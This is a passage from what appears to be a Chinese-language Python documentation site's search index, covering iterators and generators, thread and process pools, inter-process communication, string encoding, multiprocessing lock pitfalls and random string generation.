在类里面定义__iter__方法，并使用该类创建的对象就是可迭代对象 简单记忆 使用for循环遍历取值的对象叫做可迭代对象, 比如：列表、元组、字典、集合、range、字符串 判断: from collections import Iterable result = isinstance((3, 5), Iterable) print(\"是否是可迭代对象:\", result) 它是能够一次返回一个成员的对象，也就是可以 for…in 遍历的； 所有的序列类型（也就是后面要说到的 Sequence），都是可迭代对象，如 list、str、tuple，还有映射类型 dict、文件对象等非序列类型也是可迭代对象； 自定义对象在实现了 iter () 方法或者实现了 getitem () 方法后，也可以成为可迭代对象； iter() 方法接受一个可迭代对象，该方法的返回值是一个迭代器（Iterator） 那么如何判断一个对象是可迭代对象呢？很容易想到的方法是 isinstance，这时候我们需要注意一点，文档介绍如下: class collections.abc.Iterable ABC for classes that provide the **iter**() method. Checking isinstance(obj, Iterable) detects classes that are registered as Iterable or that have an **iter**() method, but it does not detect classes that iterate with the **getitem**() method. The only reliable way to determine whether an object is iterable is to call iter(obj). 简单解释就是: 通过 isinstance(obj, Iterable) 判断一个对象是否是可迭代对象时， 只有当这个对象被注册为 Iterable 或者当它实现了 iter() ** 方法的时候，才返回 True， 而对于实现了 **getitem () 方法的，返回的是 False。 所以当判断是否是可迭代对象的方式是调用 iter(obj) ，如果不报错，说明是可迭代对象，反之则不是。 迭代器(Iterator) 迭代器: An object representing a stream of data. Repeated calls to the iterator's **next**() method (or passing it to the built-in function next()) return successive items in the stream. When no more data are available a StopIteration exception is raised instead. At this point, the iterator object is exhausted and any further calls to its **next**() method just raise StopIteration again. Iterators are required to have an **iter**() method that returns the iterator object itself so every iterator is also iterable and may be used in most places where other iterables are accepted. One notable exception is code which attempts multiple iteration passes. A container object (such as a list) produces a fresh new iterator each time you pass it to the iter() function or use it in a for loop. Attempting this with an iterator will just return the same exhausted iterator object used in the previous iteration pass, making it appear like an empty container. 一个表示**数据流**的对象，可通过重复调用 next （或使用内置函数 next() ）方法来获取元素。当没有元素存在时，抛出 StopIteration 异常； iter(obj) 接受一个迭代器作为参数时，返回的是它本身。在可迭代对象里我们说过，iter(obj)方法不报错，说明它一定是一个可迭代对象。因此迭代器一定是一个可迭代对象； 一个迭代器必须要实现 iter () 方法。但因为迭代器前提必须是一个可迭代对象，所以只实现 iter () 方法不一定是一个迭代器。 在类里面定义 __iter__和 __next__方法，并使用该类创建的对象就是迭代器 (迭代器也属于可迭代对象) 判断: from collections import Iterator, Iterable result = isinstance((3, 5), Iterator) print(\"是否是迭代器:\", result) result = isinstance((3, 5), Iterable) print(\"是否是可迭代对象:\", result) 生成器 也是迭代器: A function which returns a generator iterator. It looks like a normal function except that it contains yield expressions for producing a series of values usable in a for-loop or that can be retrieved one at a time with the next() function. Usually refers to a generator function, but may refer to a generator iterator in some contexts. In cases where the intended meaning isn't clear, using the full terms avoids ambiguity. 定义：一边循坏一边计算的机制（generator） 它是一个 迭代器 ； 它是一个含有特殊关键字 yield 的 迭代器 ； 每次生成一个值，可通过 next() 方法获取。 创建一个生成器对象， 方法一：只需要将列表生成式的 [] 换成 () 即可: g = (x * x for x in range(10)) 方法二：函数使用 yield 关键字，那么这个函数将是一个 generator: def g(): a = {id:0 for id in range(10)} for k, v in a.items(): yield k, v 原理： 生成器(generator)能够迭代的关键是它有一个next()方法， 工作原理就是通过重复调用next()方法，直到捕获一个异常。 带有 yield 的函数不再是一个普通函数，而是一个生成器generator。 可用next()调用生成器对象来取值。next 两种方式 t.__next__() | next(t)。 可用for 循环获取返回值（每执行一次，取生成器里面一个值） （基本上不会用`next()`来获取下一个返回值，而是直接使用`for`循环来迭代）。 yield相当于 return 返回一个值，并且记住这个返回的位置，下次迭代时，代码从yield的下一条语句开始执行。 send() 和next()一样，都能让生成器继续往下走一步（下次遇到yield停），但send()能传一个值，这个值作为yield表达式整体的结果 ——换句话说，就是send可以强行修改上一个yield表达式值。比如函数中有一个yield赋值，a = yield 5，第一次迭代到这里会返回（5）a还没有赋值。第二次迭代时，使用.send(10)，那么，就是强行修改yield 5表达式的值为10，本来是5的，那么a=10 总结 迭代的方式有两种，一种是通过下标，即实现 getitem ，一种是直接获取值， 即实现 iter ，两种方式都可通过 **for…in** 方式进行遍历。也都是可迭代对象； isinstance 判断可迭代对象时，针对下标访问的判断有出入，需要特别注意； 可迭代对象基本要求是可遍历获取值； 序列一定是可迭代对象，它实现了 **len()** 和 getitem ，可获取长度，可通过下标访问； 迭代器一定是可迭代对象，它实现了 next ()； 生成器是特殊的迭代器，它一定是迭代器，因此也一定是可迭代对象。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Iterate.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Iterate.html"},{"title":"多线程-线程池","text":"参考: Python线程池及其原理和使用（超级详细） 系统启动一个新线程的成本是比较高的，因为它涉及与操作系统的交互。 在这种情形下，使用线程池可以很好地提升性能， 尤其是当程序中需要创建大量生存期很短暂的线程时，更应该考虑使用线程池。 线程池在系统启动时即创建大量空闲的线程，程序只要将一个函数提交给线程池， 线程池就会启动一个空闲的线程来执行它。 当该函数执行结束后，该线程并不会死亡，而是再次返回到线程池中变成空闲状态，等待执行下一个函数。 此外，使用线程池可以有效地控制系统中并发线程的数量。 当系统中包含有大量的并发线程时，会导致系统性能急剧下降， 甚至导致 Python 解释器崩溃，而线程池的最大线程数参数可以控制系统中并发线程的数量不超过此数。 线程池的使用 线程池的基类是 concurrent.futures 模块中的 Executor , Executor 提供了两个子类， 即 ThreadPoolExecutor 和 ProcessPoolExecutor， 其中 ThreadPoolExecutor 用于创建线程池，而 ProcessPoolExecutor 用于创建进程池. 详细参考: /docs/后端/python/python标准库/concurrent 如果使用线程池/进程池来管理并发编程， 那么只要将相应的 task 函数提交给线程池/进程池，剩下的事情就由线程池/进程池来搞定。 Exectuor提供的常用方法: submit(fn, *args, **kwargs)： 将 fn 函数提交给线程池。*args 代表传给 fn 函数的参数，*kwargs 代表以关键字参数的形式为 fn 函数传入参数。 map(func, *iterables, timeout=None, chunksize=1) 该函数类似于全局函数 map(func, *iterables)，只是该函数将会启动多个线程，以异步方式立即对 iterables 执行 map 处理。 shutdown(wait=True) 关闭线程池。 详见: concurrent-Executor-funs 程序将 task 函数提交（submit）给线程池后，submit 方法会返回一个 Future 对象， Future 类主要用于获取线程任务函数的返回值。 由于线程任务会在新线程中以异步方式执行， 因此，线程执行的函数相当于一个\"将来完成\"的任务，所以 Python 使用 Future 来代表。 注解 实际上，在 Java 的多线程编程中同样有 Future，此处的 Future 与 Java 的 Future 大同小异。 Future 提供了的方法(详见: concurrent-Future ) cancel()：取消该 Future 代表的线程任务。如果该任务正在执行，不可取消，则该方法返回 False；否则，程序会取消该任务，并返回 True。 cancelled()：返回 Future 代表的线程任务是否被成功取消。 running()：如果该 Future 代表的线程任务正在执行、不可被取消，该方法返回 True。 done()：如果该 Funture 代表的线程任务被成功取消或执行完成，则该方法返回 True。 result(timeout=None)：获取该 Future 代表的线程任务最后返回的结果。如果 Future 代表的线程任务还未完成，该方法将会阻塞当前线程，其中 timeout 参数指定最多阻塞多少秒。 exception(timeout=None)：获取该 Future 代表的线程任务所引发的异常。如果该任务成功完成，没有异常，则该方法返回 None。 add_done_callback(fn)：为该 Future 代表的线程任务注册一个\"回调函数\"，当该任务成功完成时，程序会自动触发该 fn 函数。 在用完一个线程池后，应该调用该线程池的 shutdown() 方法，该方法将启动线程池的关闭序列。 调用 shutdown() 方法后的线程池不再接收新任务，但会将以前所有的已提交任务执行完成。 当线程池中的所有任务都执行完成后，该线程池中的所有线程都会死亡。 使用线程池来执行线程任务的步骤如下: 调用 ThreadPoolExecutor 类的构造器创建一个线程池。 定义一个普通函数作为线程任务。 调用 ThreadPoolExecutor 对象的 submit() 方法来提交线程任务。 当不想提交任何任务时，调用 ThreadPoolExecutor 对象的 shutdown() 方法来关闭线程池。 把 action() 函数提交给线程池时，submit() 方法会返回该任务所对应的 Future 对象， 程序立即判断 futurel 的 done() 方法，该方法将会返回 False（表明此时该任务还未完成）。 接下来主程序暂停 3 秒，然后判断 future2 的 done() 方法，如果此时该任务已经完成，那么该方法将会返回 True。 程序最后通过 Future 的 result() 方法来获取两个异步任务返回的结果。 当程序使用 Future 的 result() 方法来获取结果时，该方法会阻塞当前线程， 如果没有指定 timeout 参数，当前线程将一直处于阻塞状态，直到 Future 代表的任务返回: from concurrent.futures import ThreadPoolExecutor import threading import time # 定义一个准备作为线程任务的函数 def action(max): my_sum = 0 for i in range(max): print(threading.current_thread().name + ' ' + str(i)) my_sum += i return my_sum # 创建一个包含2条线程的线程池 pool = ThreadPoolExecutor(max_workers=2) # 向线程池提交一个task, 50会作为action()函数的参数 future1 = pool.submit(action, 50) # 向线程池再提交一个task, 100会作为action()函数的参数 future2 = pool.submit(action, 100) # 判断future1代表的任务是否结束 print(future1.done()) time.sleep(3) # 判断future2代表的任务是否结束 print(future2.done()) # 查看future1代表的任务返回的结果 print(future1.result()) # 查看future2代表的任务返回的结果 print(future2.result()) # 关闭线程池 pool.shutdown() 获取执行结果 还是靠 concurrent-Future 调用 Future 的 result() 方法来获取线程任务的运回值， 但该方法会阻塞当前主线程，只有等到钱程任务完成后，result() 方法的阻塞才会被解除 如果程序不希望直接调用 result() 方法阻塞线程， 则可通过 Future 的 add_done_callback() 方法来添加回调函数， 该回调函数形如 fn(future)。 当线程任务完成后，程序会自动触发该回调函数，并将对应的 Future 对象作为参数传给该回调函数: # 定义一个准备作为线程任务的函数 def action(max): my_sum = 0 for i in range(max): print(threading.current_thread().name + ' ' + str(i)) my_sum += i return my_sum # 创建一个包含2条线程的线程池 with ThreadPoolExecutor(max_workers=2) as pool: # 向线程池提交一个task, 50会作为action()函数的参数 future1 = pool.submit(action, 50) # 向线程池再提交一个task, 100会作为action()函数的参数 future2 = pool.submit(action, 100) def get_result(future): print(future.result()) # 为future1添加线程完成的回调函数 future1.add_done_callback(get_result) # 为future2添加线程完成的回调函数 future2.add_done_callback(get_result) print('--------------') 由于线程池实现了 上下文管理协议（Context Manage Protocol） ， 因此，程序可以使用 with 语句来管理线程池，这样即可避免手动关闭线程池，如上面的程序所示。 此外，Exectuor 还提供了一个 map(func, *iterables, timeout=None, chunksize=1) 方法， 该方法的功能类似于全局函数 map()， 区别在于线程池的 map() 方法会为 iterables 的每个元素启动一个线程， 以并发方式来执行 func 函数。 这种方式相当于启动 len(iterables) 个线程，井收集每个线程的执行结果: # 创建一个包含4条线程的线程池 with ThreadPoolExecutor(max_workers=4) as pool: # 使用线程执行map计算 # 后面元组有3个元素，因此程序启动3条线程来执行action函数 results = pool.map(action, (50, 100, 150)) print('--------------') for r in results: print(r)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Multi-thread-thread-pool.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Multi-thread-thread-pool.html"},{"title":"Python下进程与线程","text":"进程和线程的区别 进程是对运行时程序的封装，是系统资源调度和分配的基本单位 线程是进程的子任务，cpu调度和分配的基本单位，实现进程内并发。 一个进程可以包含多个线程，线程依赖进程存在，并共享进程内存 线程安全 一个操作可以在多线程环境中使用，并且获得正确的结果。 线程安全的操作线程是顺序执行的而不是并发执行的。 一般涉及到写操作需要考虑如何让多个线程安全访问数据。 线程间通信 互斥量（锁）: 通过互斥机制防止多个线程同时访问公共资源。 信号量（Semphare）: 控制同一时刻多个线程访问同一个资源的线程数。 ps: python的threading 文档 事件（信号）: 通过通知的方式保持多个线程的同步。 进程间通信 IPC: Inter-Process Communication 进程间传递信号或者数据 管道/匿名管道/有名管道（pipe） 信号（Signal）: 比如用户使用ctrl+c产生SIGINT程序终止信号 消息队列（Message） 共享内存（share memory） 进程间的信号量（Semaphore） 套接字（socket）: 最常用的方式，我们的web应用就是这种方式 详细介绍 /docs/后端/python/概念相关/多线程 /docs/后端/python/概念相关/多进程 Can't pickle local object 使用多线/进程时, 一般都是使用的 /docs/后端/python/python标准库/multiprocessing 模块(或者多线程的). 其内部进行数据传输时, 会将数据序列化处理. 其内部源码使用的是 pickle 模块. 但是这个模块又不能对局部函数, lambda 函数进行序列化, 所以容易产生这样的报错: Can't pickle local object xxxx 可以从两种角度来解决: 编码时候不使用 lambda 函数/局部函数(闭包), 这个此处不做说明, 更新一下结构就行了 使用其他方式进行数据/对象的序列化, 或者直接使用其他模块 其他序列化方式 dill dill 安装: pip install dill 使用: import dill obj = SomeClass() data = dill.dumps(obj) obj = dill.loads(data) 其他模块 pathos.multiprocessing: from pathos.multiprocessing import ProcessingPool as Pool","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Process-and-thread.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Process-and-thread.html"},{"title":"Python的编码","text":"字符编码 为了处理英文字符，产生了ASCII码。 为了处理中文字符，产生了GB2312。 为了处理各国字符，产生了Unicode。 为了提高Unicode存储和传输性能，产生了UTF-8，它是Unicode的一种实现形式。 encode和decode 讲解编码和解码之前，先来讲讲Unicode和utf-8的关系， 推荐 http://flyer103.diandian.com/post/2014-03-09/40061199665 可以这样来理解: 字符串是由字符构成，字符在计算机硬件中通过二进制形式存储， 这种二进制形式就是编码。 如果直接使用: 字符串↔️字符↔️二进制表示（编码） 会增加不同类型编码之间转换的复杂性。所以引入了一个抽象层: 字符串↔️字符↔️与存储无关的表示↔️二进制表示（编码） 这样，可以用一种与存储无关的形式表示字符， 不同的编码之间转换时可以先转换到这个抽象层，然后再转换为其他编码形式。 在这里，unicode 就是 \"与存储无关的表示\"，utf—8 就是 \"二进制表示\"。 python2中字符串有两种表示形式，str和unicode。 str可以理解为上面这段话中的二进制编码格式，unicode可以理解为抽象层。 encode是编码，即从unicode格式到二进制的编码格式如utf-8、gb2312等。decode是解码， 即从二进制编码格式到unicode编码格式。 原文: https://www.cnblogs.com/jinhaolin/p/5128973.html Python的字符编码 Python2中默认的字符编码是ASCII码。 Python2中字符串有str和unicode两种类型。str有各种编码的区别，unicode是没有编码的标准形式。 Python2中可以直接查看到unicode的字节串。 python3默认使用unicode编码，unicode字节串将被直接处理为中文显示出来。 decode()与encode()方法 decode()方法将其他编码字符转化为Unicode编码字符。 encode()方法将Unicode编码字符转化为其他编码字符。 python3一个新特性就是对文本和二进制做了更清晰的划分，文本是str，二进制是byte(x01x06...) 编码: encode：str --> byte 解码: decode：byte --> str 实际遇到的问题 win10下python2.7读取一个txt文本出现了乱码 最终解决方案有两个： 方案一: 使用decode方法: #text.txt是读取的文件内容，编码ANSI，实际应该是gb2312吧 with open(\"text.txt\",\"r\") as f: lines = f.readlines() #将内容转换为数组 for line in lines: print line.decode('gb2312') #直接print line会报错，参数为原本的编码 decode函数的参数是本身的编码，表示以此编码解析为unicode 方案二: 导入codecs模块: #text.txt是读取的文件内容，编码ANSI，实际应该是gb2312吧 #codesc.open的encoding参数可以指定原文件的编码，读取写入就会自动转换 with codecs.open(\"text.txt\",\"r\",encoding=\"gb2312\") as f: lines = f.readlines() #将内容转换为数组 for line in lines: print line 其他 读文件时候asacll一直无法转换成功，使用json.dumps解决: >>> a='\\xe6\\x81\\xb6\\xe6\\x84\\x8f\\xe8\\xbd\\xaf\\xe4\\xbb\\xb6' >>> bb=json.dumps(a, encoding=\"UTF-8\", ensure_ascii=False) >>> print(bb)","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-Python's-encoding.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python's-encoding.html"},{"title":"字符串前面加u,r,b的含义","text":"u/U 表示unicode字符串 不是仅仅是针对中文, 可以针对任何的字符串，代表是对字符串进行unicode编码。 一般英文字符在使用各种编码下, 基本都可以正常解析, 所以一般不带u；但是中文, 必须表明所需编码, 否则一旦编码转换就会出现乱码。 建议所有编码方式采用utf8 r/R 非转义的原始字符串 与普通字符相比，其他相对特殊的字符，其中可能包含转义字符，即那些，反斜杠加上对应字母， 表示对应的特殊含义的，比如最常见的\"n\"表示换行，\"t\"表示Tab等。 而如果是以r开头，那么说明后面的字符，都是普通的字符了，即如果是\"n\"那么表示一个反斜杠字符，一个字母n，而不是表示换行了。 以r开头的字符，常用于正则表达式，对应着re模块。 b:bytes python3.x里默认的str是(py2.x里的)unicode, bytes是(py2.x)的str, b\"\"前缀代表的就是bytes python2.x里, b前缀没什么具体意义， 只是为了兼容python3.x的这种写法","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-The-meaning-of-add-U,-R,-B-in-front-of-the-string.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-The-meaning-of-add-U,-R,-B-in-front-of-the-string.html"},{"title":"Python多进程","text":"Python多进程方面涉及的模块主要包括: /docs/后端/python/python标准库/subprocess /docs/后端/python/python标准库/mmap /docs/后端/python/python标准库/multiprocessing : 提供支持多处理器技术的多进程编程接口, 并且接口的设计最大程度地保持了和threading模块的一致, 便于理解和使用. 进程间通信 信号, 管道(不安全,默认没加锁), 消息队列, 信号量, 共享内存, socket 信号 signal. 在多个进程中通信的机制中, 只有singal是异步执行的 管道 半双工,默认无锁, 不安全, 双向通信(只能一端发, 一端收) - 匿名管道, 只能在具有亲缘关系进程间通信 - 命名管道, 允许无亲缘关系进程通信 消息队列 由消息组成的链表, 存放在内核中并由消息队列标识符标识. 消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点 信号量 是一个计数器, 可以用来控制多个进程对共享资源的访问. 它常作为一种锁机制, 防止某进程正在访问共享资源时, 其他进程也访问该资源. 因此, 主要作为进程间以及同一进程内不同线程之间的同步手段. 共享内存 共享内存就是映射一段能被其他进程所访问的内存, 这段共享内存由一个进程创建, 但多个进程都可以访问. 共享内存是最快的 IPC 方式, 它是针对其他进程间通信方式运行效率低而专门设计的. 它往往与其他通信机制, 如信号量, 配合使用, 来实现进程间的同步和通信. 套接字 也是一种进程间通信机制, 与其他通信机制不同的是, 它可用于不同机器之间的进程通信. 事件 python进程的事件用于主进程控制其他进程的执行 信号 signal 信号通过注册的方式‘挂'在一个进程中, 并且不会阻塞该进程的运行。 一个进程一旦接收到其他进程（可能是应用中的其他进程, 也可能使操作系统中的进程）发送的信号就会打断原来的程序执行流程来处理这个信号。 注解 异步: 程序在执行中利用内核功能帮助完成必要的辅助操作,不影响应用层持续执行 注意: 这里的同步和异步机制是相对多进程而言的。 在多个进程中通信的机制中, 只有singal是异步执行的 和kill相关的几个函数: signal.alarm(sec): 见 /docs/后端/python/python标准库/signal signal.pause(): 见 /docs/后端/python/python标准库/signal signal.signal(sig,handler): 见 /docs/后端/python/python标准库/signal 管道 管道, 半双工,默认无锁, 不安全, 双向通信(一端发, 一端收) 匿名管道, 只能在具有亲缘关系进程间通信 命名管道, 允许无亲缘关系进程通信 from multiprocessing import Pipe 消息队列 消息队列, 基于管道实现, 有加锁, 数据安全 消息队列是由消息组成的链表, 存放在内核中并由消息队列标识符标识. 消息队列克服了信号传递信息少、管道只能承载无格式字节流以及缓冲区大小受限等缺点. Queue JoinableQueue : 有put端和get的技术机制. 每次get()数据发送task_done() put端计数-1, 直到get()端取完了队列的所有数据, put()端的join()就会接受到信号, 直到get()端已经接受完数据了 共享内存 共享内存就是映射一段能被其他进程所访问的内存. 这段共享内存由一个进程创建, 但多个进程都可以访问. 共享内存是最快的 IPC 方式, 它是针对其他进程间通信方式运行效率低而专门设计的. 它往往与其他通信机制, 如信号量, 配合使用, 来实现进程间的同步和通信. from multiprocessing import Manager 例: # 共享内存, 举例, https://www.jb51.net/article/232067.htm from multiprocessing import Value,Array obj = Value(ctype,data) # 功能: 开辟共享内存 # 参数: ctype 表示共享内存空间类型 'i' 'f' 'c' # data 共享内存空间初始数据 # 返回值: 共享内存对象 obj.value # 对象属性的修改查看即对共享内存读写 obj = Array(ctype,data) # 功能: 开辟共享内存 # 参数: ctype 表示共享内存空间类型 'i' 'f' 'c' # data 整数表示开辟空间的大小,其数据表示开辟空间 # 返回值: 共享内存对象 # Array共享内存读写:通过遍历obj可以得到每个值,直接通过索引可以修改 # * 可以使用obj.value 直接打印共享内存中的字节串 信号量 信号量(信号灯集) 给定一个数量对多个进程可见,多个进程都可以操作该数增减,并根据数量值决定自己的行 信号量是一个计数器, 可以用来控制多个进程对共享资源的访问. 它常作为一种锁机制, 防止某进程正在访问共享资源时, 其他进程也访问该资源. 因此, 主要作为进程间以及同一进程内不同线程之间的同步手段. from multiprocessing import Semaphore sem = Semaphore(num) # 功能: 创建信号量对象 # 参数: 信号量的初始值 # 返回值: 信号量对象 sem.acquire() # 信号量减1 当信号量为0时阻塞 sem.release() # 信号量加1 sem.get_value() # 获取信号量数量 套接字 套接字（socket）通信 套接口也是一种进程间通信机制, 与其他通信机制不同的是, 它可用于不同机器之间的进程通信. multiprocessing.Manager 共享全局变量 (共享内存) 注意, 如果要共享变量, 只能将共享的变量定义在外部使用, 然后调用进程的时候传入, 最终获取还是在使用外部命名获取: # coding: utf-8 \"\"\" python 进程间通信测试, 主进程跟, 异步进程池 \"\"\" import asyncio import time from concurrent.futures import ProcessPoolExecutor from multiprocessing import Manager, Pipe from typing import Optional class SonPool(object): _total: Optional[int] = None _now: Optional[int] = None _total_manager = None _now_manager = None _list_manager = [None, None] @classmethod def get_now_and_total(cls): return [cls._now, cls._total] @classmethod def get_now_and_total_manager_val(cls): print('_manager', cls._now_manager, cls._total_manager) if cls._now_manager and type(cls._now_manager) != int: print('_manager', cls._now_manager.value, cls._total_manager.value) return [cls._now_manager.value, cls._total_manager.value] return [cls._now_manager, cls._total_manager] @classmethod def get_list_manager_val(cls): print('inner _list_manager', [x for x in cls._list_manager]) return cls._list_manager @classmethod def _reset(cls): cls._total = None cls._now = None cls._total_manager = Manager().Value(int, 1) cls._now_manager = Manager().Value(int, 1) cls._list_manager = Manager().list([None, None]) @staticmethod async def _async_long_time_wait(): await asyncio.sleep(3) print('sleep 3 s') @staticmethod def _long_time_wait(*args): time.sleep(5) print('sleep 5', *args) @classmethod def _set_total(cls): cls._long_time_wait('total') cls._total = 100 if cls._total_manager: cls._total_manager.value = 101 else: cls._total_manager = 101 cls._list_manager.append(102) @classmethod def _set_now(cls): cls._long_time_wait('now') cls._now = 10 if cls._now_manager: cls._now_manager.value = 11 else: cls._now_manager = 11 cls._list_manager.append(12) @classmethod def run(cls, *args, **kwargs): if args: # cls._list_manager = arg_dict.get('list_manager') cls._list_manager = args[0] cls._total_manager = args[1] cls._now_manager = args[2] cls._set_now() cls._set_total() print('inner SonPool val', '\\ninner now, total: ', SonPool.get_now_and_total(), '\\ninner now, total manager: ', SonPool.get_now_and_total_manager_val(), '\\ninner list manager: ', SonPool.get_list_manager_val(), ) async def main_process(): loop = asyncio.get_running_loop() pool = ProcessPoolExecutor() # 类内定义变量不支持进程之间共享, 错误用法 SonPool._total_manager = Manager().Value(int, None) SonPool._now_manager = Manager().Value(int, None) SonPool._list_manager = Manager().list([None, None]) # 用变量, 外部定义, 这样传入才可以正确通信 list_manager = Manager().list([None, None]) total_manager = Manager().Value(int, None) now_manager = Manager().Value(int, None) # 这样外部封装也行, 不过传入的时候还是要传入 LocalSonPool.total # class LocalSonPool(object): # total = Manager().Value(int, None) # now = Manager().Value(int, None) # list_m = Manager().list([None, None]) # 用管道 # 还没写, fd1, fd2 = Pipe() async def _check_task1(m1, m2): while True: print('check_task1', m1.value, m2.value) await asyncio.sleep(1) # async def _check_task2(): # while True: # print('check_task2', now_manager.value, total_manager.value) # await asyncio.sleep(1) loop.create_task(_check_task1(now_manager, total_manager)) # 这样也可以 # loop.create_task(_check_task2()) # await loop.run_in_executor(pool, SonPool.run, ) await loop.run_in_executor(pool, SonPool.run, list_manager, total_manager, now_manager,) print('main val', # SonPool main跟进程池用的是两个不同空间的, 所以不能这样用 '\\nmain now, total: ', SonPool.get_now_and_total(), '\\nmain now, total manager: ', SonPool.get_now_and_total_manager_val(), '\\nmain list manager: ', SonPool.get_list_manager_val(), # 只有下面的这样, 定义在main, 使用main的调用才可以获取到值 '\\nouter list manager', [x for x in list_manager], '\\nouter now manager', now_manager.value, '\\nouter total manager', total_manager.value, ) def main(): loop = asyncio.get_event_loop() loop.create_task(main_process()) loop.run_forever() if __name__ == '__main__': main() 事件 python进程的事件用于主进程控制其他进程的执行, 事件主要提供了三个方法 set、wait、clear. 事件处理的机制: 想象全局定义了一个\"Flag\", 如果\"Flag\"值为 False, 那么当程序执行 event.wait 方法时就会阻塞, 如果\"Flag\"值为True, 那么event.wait 方法时便不再阻塞. 其中, clear方法: 将\"Flag\"设置为False, set方法: 将\"Flag\"设置为True: # 来源: https://zhuanlan.zhihu.com/p/446374478 import multiprocessing import time from multiprocessing import Process, Queue, set_start_method event = multiprocessing.Event() def xiao_fan(event): print('小贩: 生产...') print('小贩: 售卖...') # time.sleep(1) print('小贩: 等待就餐') event.set() event.clear() event.wait() print('小贩: 谢谢光临') event.set() event.clear() def gu_ke(event): print('顾客: 准备买早餐') event.set() event.clear() event.wait() print('顾客: 买到早餐') print('顾客: 享受美食') # time.sleep(2) print('顾客: 付款, 真好吃...') event.set() event.clear() if __name__ == '__main__': set_start_method('fork', True) # 创建进程 xf = multiprocessing.Process(target=xiao_fan, args=(event,)) gk = multiprocessing.Process(target=gu_ke, args=(event, )) # 启动进程 gk.start() xf.start() # time.sleep(2) 互斥锁-进程锁 可使用 /docs/后端/python/python标准库/multiprocessing 的 Lock() 函数 缓冲I/O 分为：无缓冲，行缓冲，全缓冲 通过 read 和 write 系统调用直接读写文件，就是无缓冲模式，性能也最差。 而通过标准 I/O 库读写文件，就是缓冲模式，标准 I/O 库提供缓冲的目的是尽可能减少 read 和 write 调用的次数，提高性能。 行缓冲模式 当在输入输出中遇到换行符时，才进行实际 I/O 操作。 全缓冲模式 当填满缓冲区时，才进行实际 I/O 操作。 管道和普通文件默认是全缓冲的; 标准输入和标准输出默认是行缓冲的; 标准错误默认是无缓冲的。 获取子进程的返回值 队列: multiprocessing.Queue() Pool.map(): from multiprocessing import Pool import time def func(i): return i*i if __name__ == '__main__': p = Pool(5) ret = p.map(func,range(10)) print(ret) pool.apply_async: from multiprocessing import Pool def func(): return 1 pool = multiprocessing.Pool(processes=1) p = pool.apply_async(func, (i,)) pool.close() # 关闭进程池，表示不能再往进程池中添加进程，需要在join之前调用 pool.join() # 等待进程池中的所有进程执行完毕 print(p.get()) # 使用get获取值 multiprocessing.Manager: from multiprocessing import Manager Manager().list() 一些报错 can't pickle _thread.lock objects 使用进程池报错, TypeError: can't pickle _thread.lock objects from concurrent.futures.process import ProcessPoolExecutor 进程池内部处理使用了pickle模块(用于python特有的类型和python的数据类型间进行转换) 中的dump(obj, file, protocol=None,)方法对参数进行了封装处理. 而pickle dump 方法不支持自定义的类. pickle用来序列化对象很方便, 但是pickle对传入对象的要求是不能是内部类, 也不能是lambda函数. 解决 方法一: 使用dill包来代替, 使用方法和pickle一样: pip install dill 使用: import dill class Obj: def __init__(self, info): self.info = info obj = Obj(\"this is a local object\") pk = dill.dumps(obj) new_obj = dill.loads(pk) dill扩展了python的pickle模块, 用于对大多数内置python类型进行序列化和反序列化. 序列化是将对象转换为字节流的过程, 而相反的过程是将字节流转换回python对象层次结构. 所以如果遇到了pickle模块无法序列化的对象, 不妨试试dill. 方法二: from pathos.multiprocessing import ProcessingPool 使用pathos的进程池 https://github.com/uqfoundation/pathos 方法三: 将定义(或者说定义的闭包)放在外部 一些坑 系统: MacOS 12. Python3.9 多进程使用 multiprocessing.Lock , 如果定义在全局变量然后使用是不可行的. threading模块貌似没有这个问题, 应该是全局解释器锁的原因. 全局定义示例代码: # coding: utf-8 import time from multiprocessing import Lock, Process lock = Lock() def run1(): lock.acquire() print('run1 get lock') time.sleep(3) def run2(): lock.acquire() print('run2 get lock') time.sleep(3) print('run2 release lock') lock.release() if __name__ == '__main__': p1 = Process(target=run1,) p2 = Process(target=run2,) p1.start() p1.join() p2.start() time.sleep(5) print('main thread release lock') lock.release() 错误输出: run1 get lock run2 get lock run2 release lock Traceback (most recent call last): File \"/Users/yanque/project/pycharm/mytest/with_mul_process/global_lock2.py\", line 30, in <module> lock.release() ValueError: semaphore or lock released too many times main thread release lock 可以看到连续 acquire 了两次锁... 而且之前的demo还没有报错信息 这里估计是变量的多进程多核访问问题, 网上很多文章都用的全局变量定义, 误导人. 不使用全局变量而是传值之后: # coding: utf-8 import time from multiprocessing import Lock, Process def run1(lock: Lock): lock.acquire() print('run1 get lock') time.sleep(3) def run2(lock: Lock): lock.acquire() print('run2 get lock') time.sleep(3) print('run2 release lock') lock.release() if __name__ == '__main__': _lock = Lock() p1 = Process(target=run1, args=(_lock,), ) p2 = Process(target=run2, args=(_lock,), ) p1.start() p1.join() p2.start() time.sleep(5) print('main thread release lock') _lock.release() 输出正常了: run1 get lock main thread release lock run2 get lock run2 release lock 当天下班想起这个问题, 突然反应过来 不同进程分配的是不同的资源, 所以使用全局变量的时候, 每个进程使用的都是不同的全局变量, 所以会出现异常的问题.","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Concept-multi-Progress.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-multi-Progress.html"},{"title":"生成随机字符串","text":"生成随机字符串: #!/usr/bin/env python2.7 # -*- coding: utf-8 -*- import random import string def ranstr(num): salt = ''.join(random.sample(string.ascii_letters + string.digits, num)) return salt salt = ranstr(6) print salt random.sample(str, num) 从str字符串中随机选取num个字符 string.ascii_letters 返回26个英文字母的大小写字符串 string.digits 返回阿拉伯数字的字符串。","tags":"后端","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Generate-random-string.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Generate-random-string.html"},{"title":"自制pip包","text":"自制pip包, 打包为 whl / tar.gz 格式 首先需要自己的一份源码, 一般结构如下, src目录下是自己的源代码, 注意要有 __init__ 文件表示是一个python模块: ├── LICENSE ├── README.md ├── 